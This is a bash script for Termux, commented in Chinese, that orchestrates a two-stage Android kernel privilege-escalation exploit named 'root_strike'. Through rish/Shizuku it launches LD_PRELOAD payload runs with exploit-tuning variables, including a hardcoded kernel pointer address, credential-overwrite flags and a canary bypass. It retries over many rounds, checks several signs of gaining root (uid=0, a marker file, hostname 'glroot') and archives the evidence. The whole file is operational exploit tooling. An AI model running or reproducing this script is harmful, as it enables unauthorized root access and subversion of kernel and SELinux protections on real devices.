#!/data/data/com.termux/files/usr/bin/bash
# ============================================================
# root_strike v1 — 先拿 root (R→C), 无 KO 无 E5R, 最小风险
# 用法: Termux `bash ~/root_strike.sh` / bash root_strike.sh [轮数]
# 判据 (全读主观 cred 或落盘, 不用 status Uid 通道):
#   L1 child 日志 ROOT-SEEN euid=0   L2 after setres uid=0
#   L3 root_alive.txt 落盘           L4 uname -n = glroot
# ============================================================
set -u
RISH="$HOME/rish"
[ -x "$RISH" ] || RISH=$(find "$HOME" -maxdepth 2 -name rish -type f 2>/dev/null | head -1)
[ -x "$RISH" ] || { echo "!! no rish"; exit 1; }
OUTD=/data/local/tmp
LOG=$OUTD/rs_log.txt
EV=/sdcard/Documents/matisse_backup_essentials/root_evidence
MAX=${1:-12}
ROLL=0
mkdir -p $EV

rsh1(){ local cmd="$1" t="${2:-60}"
  (cd "$HOME" && timeout "$t" $RISH -c "$cmd") 2>&1; }
rsh(){ local cmd="$1" t="${2:-60}" out i
  for i in 1 2 3 4; do
    out=$(rsh1 "$cmd" "$t")
    printf '%s' "$out" | grep -q "Request timeout\|blocked by your system" || { printf '%s\n' "$out"; return 0; }
    [ "$i" -lt 4 ] && echo "  [rish 闪断 $i/4, 8s 重试]"
    sleep 8
  done; printf '%s\n' "$out"; return 1; }

echo "=== root_strike $(date +%T) max=$MAX ==="
# ── 体检 ──
BOOT=$(rsh "cat /proc/sys/kernel/random/boot_id" 20 | tr -d '\r')
printf '%s' "$BOOT" | grep -qE '^[0-9a-f]{8}-' || { echo "!! boot 读数异常 (Shizuku?)"; exit 4; }
ENF=$(rsh "getenforce" 20 | tr -d '\r')
[ "$ENF" = "Enforcing" ] || { echo "!! enforce=$ENF 非预期"; exit 4; }
UP=$(rsh "awk '{print int(\$1)}' /proc/uptime" 20 | tr -d '\r')
[ "${UP:-0}" -ge 600 ] || { echo "!! 开机不足 10min (settle), 稍后再跑"; exit 4; }
LOAD=$(rsh "cat /proc/loadavg" 20 | tr -d '\r' | cut -d' ' -f1)
L15=${LOAD%.*}; [ "${L15:-99}" -le 15 ] || { echo "!! load=$LOAD >15 (铁律), 稍后再跑"; exit 4; }
echo "体检 OK: boot=$(printf '%s' "$BOOT" | cut -c1-8) load=$LOAD"

for ((ROLL=1; ROLL<=MAX; ROLL++)); do
  echo "[roll $ROLL/$MAX] $(date +%T) R 轮发射..."
  rsh "rm -f $OUTD/mt49_child_status.txt $OUTD/root_alive.txt $OUTD/R.out $OUTD/C.out" 20 >/dev/null
  rsh "timeout 250 env PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=R PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1 LD_PRELOAD=$OUTD/preload.so /system/bin/sleep 180 > $OUTD/R.out 2>&1" 280 >/dev/null
  ST=$(rsh "cat $OUTD/mt49_child_status.txt" 30 | tr -d '\r')
  echo "$ST" | grep -q "CapEff=0000000000000000" && { echo "[roll $ROLL] R MISS — 重掷"; sleep 45; continue; }
  TASK=$(printf '%s' "$ST" | grep -a '^task=' | tail -1 | cut -d= -f2 | cut -d' ' -f1)
  CPID=$(rsh "grep -ah 'child pid' $OUTD/R.out 2>/dev/null | tail -1" 2>/dev/null | sed 's/.*child pid=\([0-9]*\).*/\1/' | tr -d '\r ')
  echo "[roll $ROLL] R LANDED task=$TASK child=$CPID — C 击..."
  sleep 20
  # 心跳新鲜度
  NOW=$(date +%s); MT=$(rsh "stat -c %Y $OUTD/mt49_child_status.txt" 20 2>/dev/null | tr -d '\r ')
  AGE=$(( NOW - ${MT:-0} ))
  [ "$AGE" -gt 30 ] && { echo "[roll $ROLL] 心跳过期 ${AGE}s — child 死亡, 重掷"; sleep 45; continue; }
  # ── C 击 (环境变量全在 env 块内, 无 KO 无 E5R) ──
  rsh "timeout 250 env PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=C PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 PSELECT_TASK=$TASK PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1 LD_PRELOAD=$OUTD/preload.so /system/bin/sleep 180 > $OUTD/C.out 2>&1" 280 >/dev/null
  # ── 五层分析 ──
  echo "[roll $ROLL] C 完成, 分析..."
  L1=$(rsh "grep -ac 'ROOT-SEEN' $OUTD/R.out" 30 2>/dev/null | tr -d '\r ')
  L2=$(rsh "grep -ac 'after setres uid=0' $OUTD/R.out" 30 2>/dev/null | tr -d '\r ')
  RA=$(rsh "cat $OUTD/root_alive.txt" 30 2>/dev/null | tr -d '\r' | head -1)
  HN=$(rsh "uname -n" 30 2>/dev/null | tr -d '\r')
  UIDLINE=$(rsh "grep '^Uid' /proc/$CPID/status" 30 2>/dev/null | tr -d '\r' | head -1)
  echo "[roll $ROLL] 判据: L1(ROOT-SEEN)=$L1 L2(setres)=$L2 L3(root_alive)=[$RA] L4(host)=[$HN] childUid=[$UIDLINE]"
  if [ "$HN" = "glroot" ] || [ -n "$RA" ] || [ "${L2:-0}" -ge 1 ]; then
    echo ""
    echo "★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★"
    echo "★★ ROOT 行为级达成 (roll $ROLL) ★★"
    echo "★★ root_alive: $RA"
    echo "★★ hostname:   $HN"
    echo "★★ 证据已归档: $EV/roll_$ROLL"
    echo "★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★"
    mkdir -p $EV/roll_$ROLL
    rsh "cp $OUTD/R.out $OUTD/C.out $OUTD/rs_log.txt $EV/roll_$ROLL/ 2>/dev/null" 60 >/dev/null
    rsh "cp /proc/$CPID/status $EV/roll_$ROLL/child_status.txt 2>/dev/null" 60 >/dev/null
    sync
    break
  fi
  echo "[roll $ROLL] C 未确认落地, 重掷"
  sleep 45
done
echo "=== root_strike end $(date +%T) ==="
